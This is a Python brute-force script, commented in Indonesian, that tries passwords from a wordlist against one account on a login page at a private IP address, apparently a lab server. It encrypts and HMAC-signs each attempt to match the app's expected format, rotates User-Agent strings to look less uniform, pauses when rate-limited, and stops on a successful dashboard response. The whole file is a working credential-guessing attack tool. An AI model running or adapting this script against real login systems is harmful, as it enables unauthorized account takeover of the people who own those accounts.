import base64
import json
import time
import random
import hmac
import hashlib
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# --- Konfigurasi ---
AES_KEY = b"MySecretKey12345"
AES_IV = b"RandomInitVector"
HMAC_SECRET = b"ThisIsHmacSecretKey"
BLOCK_SIZE = 16
TARGET_URL = "http://192.168.70.202:3333/login5.php"
USERNAME = "juggstest11"
DELAY = 1.5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

# --- Fungsi ---
def encrypt_payload(data_json):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(data_json.encode('utf-8'), BLOCK_SIZE)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

def hmac_sha256(message):
    return hmac.new(HMAC_SECRET, message.encode(), hashlib.sha256).hexdigest()

def send_request(username, password):
    payload = json.dumps({"username": username, "password": password})
    encrypted = encrypt_payload(payload)
    signature = hmac_sha256(encrypted)

    headers = {
        "Content-Type": "text/plain",
        "X-Signature": signature,
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        response = requests.post(TARGET_URL, data=encrypted, headers=headers, timeout=10)
        return response.text, response.status_code
    except Exception as e:
        print(f"[!] Request error: {e}")
        return "", 0

# --- Brute Force Password ---
with open("password-wordlists.txt") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"=== Mulai brute force password untuk user: {USERNAME} ===")

for password in passwords:
    response_text, status = send_request(USERNAME, password)

    if "Password salah" in response_text:
        print(f"[×] {USERNAME} | Password salah: {password}")
    elif "Selamat datang" in response_text or "Dashboard" in response_text or "<title>Dashboard" in response_text:
        print(f"[✓] Login berhasil! Username: {USERNAME} | Password: {password}")
        break
    elif "Rate Limit" in response_text:
        print("[!] Rate limit terdeteksi. Menunggu 10 detik...")
        time.sleep(10)
    else:
        print(f"[?] {USERNAME} | Respon tidak dikenali [HTTP {status}]")
        print(response_text[:100])

    time.sleep(DELAY)
